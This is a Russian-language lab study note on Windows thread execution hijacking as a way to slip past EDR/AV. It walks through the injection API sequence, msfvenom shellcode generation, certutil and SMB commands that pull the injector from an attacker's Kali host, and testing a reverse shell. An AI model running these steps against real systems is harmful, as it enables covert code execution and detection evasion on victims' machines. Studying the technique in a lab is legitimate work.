## Thread Execution Hijacking (Перехват потока выполнения)

### Что такое Thread Hijacking

Thread Hijacking — это техника инжекта, при которой мы внедряем шелл-код в память процесса, а затем **перенаправляем выполнение существующего потока** этого процесса на наш код. Вместо создания нового потока (как в классическом инжекте), мы захватываем уже работающий поток, приостанавливаем его, меняем его указатель инструкций (RIP/EIP) на адрес нашего шелл-кода и возобновляем. Процесс продолжает работать, но теперь выполняет наш код.

**Ключевое отличие:** Мы не создаём новый поток, а перехватываем управление у существующего.


### Почему это эффективно

Создание нового потока через `CreateRemoteThread` — это аномалия, которую легко детектировать (EDR/AV отслеживают такие вызовы). Thread Hijacking **использует уже существующий легитимный поток**, что выглядит естественно и реже вызывает подозрения. Это классический пример **Living Off the Land** — использование стандартных функций ОС для скрытного выполнения кода.


### Одиннадцать шагов Thread Hijacking

**Шаг 1** — открываем целевой процесс через `OpenProcess` с правами `PROCESS_ALL_ACCESS`. Находим PID процесса через `tasklist` или другие инструменты.

**Шаг 2** — выделяем память в целевом процессе через `VirtualAllocEx` с флагами `MEM_RESERVE | MEM_COMMIT` и `PAGE_EXECUTE_READWRITE`. Размер — под наш шелл-код.

**Шаг 3** — записываем шелл-код в выделенную память через `WriteProcessMemory`.

**Шаг 4** — создаём снимок всех потоков системы через `CreateToolhelp32Snapshot` с флагом `TH32CS_SNAPTHREAD`. Это позволяет получить список всех потоков.

**Шаг 5** — перебираем потоки через `Thread32First` и `Thread32Next` в цикле. Для каждого потока проверяем, принадлежит ли он нашему целевому процессу (сравниваем `th32OwnerProcessID` с PID процесса).

**Шаг 6** — когда находим нужный поток, открываем его через `OpenThread` с правами `THREAD_ALL_ACCESS`. Сохраняем `th32ThreadID` для дальнейшей работы.

**Шаг 7** — приостанавливаем целевой поток через `SuspendThread`. Поток останавливается и не выполняет никаких инструкций.

**Шаг 8** — получаем текущий контекст потока через `GetThreadContext`. Контекст содержит состояние всех регистров процессора, включая указатель инструкций.

**Шаг 9** — изменяем указатель инструкций (RIP для x64, EIP для x32) на адрес нашего шелл-кода. Теперь, когда поток возобновится, он начнёт выполнение с нашего кода.

**Шаг 10** — обновляем контекст потока через `SetThreadContext`. Передаём изменённую структуру с новым RIP.

**Шаг 11** — возобновляем поток через `ResumeThread`. Поток продолжает выполнение, но теперь с нашего шелл-кода.


### Сравнение с другими техниками

| Техника | Что делает |
|---------|------------|
| **Shellcode Injection** | Создаёт новый поток через `CreateRemoteThread` |
| **Process Hollowing** | Создаёт новый процесс, заменяет его код, возобновляет |
| **Thread Hijacking** | Перехватывает существующий поток, меняет его RIP |


### Отличия от Process Hollowing

При холлоинге мы **создаём новый процесс** и заменяем весь его код. При Thread Hijacking мы работаем с **уже запущенным процессом** и существующим потоком. Это два принципиально разных подхода: холлоинг даёт полный контроль над процессом, Thread Hijacking — только над одним потоком.


### Важные нюансы

**RIP (x64) vs EIP (x32).** Для 64-битных систем используется регистр **RIP**, для 32-битных — **EIP**. В коде нужно указывать правильный регистр в зависимости от архитектуры.

**Состояние регистров.** При перехвате потока важно сохранить оригинальное состояние регистров, если это необходимо (можно использовать структуру `CONTEXT` для восстановления после выполнения шелл-кода).

**Стабильность процесса.** Если шелл-код завершится некорректно (например, вызовет `ExitThread`), весь процесс может упасть. Поэтому часто шелл-код сначала выполняет свою задачу, а затем **восстанавливает оригинальный поток** (возвращает RIP на исходную инструкцию).

**Выбор потока.** Лучше перехватывать поток, который не критичен для работы процесса (например, поток в режиме ожидания), чтобы не нарушить его функциональность.


### Практическое применение

Thread Hijacking используется для обхода EDR/AV, которые детектируют создание новых потоков. Вместо вызова `CreateRemoteThread` мы используем существующий поток, что делает атаку менее заметной.


### Простыми словами

Представь, что ты хочешь, чтобы кто-то прочитал твою записку вместо своей. Ты не добавляешь нового человека (новый поток), а подходишь к уже существующему, даёшь ему свою записку и говоришь: "Прочитай это вместо того, что у тебя было". Ты приостанавливаешь его (Suspend), меняешь текст в его руках (меняешь RIP), а затем говоришь "Продолжай" (Resume). Он читает твою записку, даже не подозревая, что текст был подменён.

## Практический порядок действий для Thread Hijacking


### 1. Написать код (thread-hijack.cpp)

Создаём инжектор, который:
- Открывает процесс по PID
- Выделяет память и пишет шелл-код
- Находит поток в целевом процессе
- Приостанавливает его, меняет RIP на наш код
- Возобновляет выполнение


### 2. Скомпилировать под целевую архитектуру

**Для 32-битной Windows (x86):**
```bash
i686-w64-mingw32-g++ thread-hijack.cpp -o thread-hijack.exe -O2 -s -static
```

**Для 64-битной Windows (x64):**
```bash
x86_64-w64-mingw32-g++ thread-hijack.cpp -o thread-hijack.exe -O2 -s -static
```

**Важно:** Если в коде используются регистры **EIP** — компилируй под x86. Если **RIP** — под x64. Иначе инжект не сработает.


### 3. Сгенерировать шелл-код (если нужен)

На Kali:
```bash
# Для x64
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c

# Для x86
msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -f c
```

Вставить полученный массив в `shellcode[]` в коде.


### 4. Передать инжектор на целевую машину

**Способы:**
- RDP-буфер обмена (Ctrl+C / Ctrl+V)
- HTTP-сервер:
  ```bash
  # На Kali
  python3 -m http.server 8080
  
  # На целевой
  certutil -urlcache -f http://<Kali_IP>:8080/thread-hijack.exe thread-hijack.exe
  ```
- SMB-шара:
  ```bash
  # На Kali
  impacket-smbserver share /tmp -smb2support
  
  # На целевой
  copy \\<Kali_IP>\share\thread-hijack.exe .
  ```


### 5. Найти PID процесса-жертвы

На целевой машине:
```cmd
tasklist /V 
```

Из вывода берём PID, например:
```
badr.exe                      4104 RDP-Tcp#6   3   82,228 K Running   INJECTION-SANDB\THM-Attacker
```
**PID: 4104**

Или для теста запустить свой процесс:
```cmd
notepad.exe
tasklist | findstr notepad
# Запомнить PID
```


### 6. Запустить инжектор

**Если инжектор принимает PID:**
```cmd
thread-hijack.exe 4104
```

### 7. Проверить результат

**Вариант 1 — калькулятор:**
Если шелл-код был для `calc.exe` — должно открыться окно калькулятора.

**Вариант 2 — реверс-шелл:**
Если использовался шелл-код для соединения — проверить свой listener на Kali.

- Какой регистр меняется? (RIP для x64, EIP для x86)
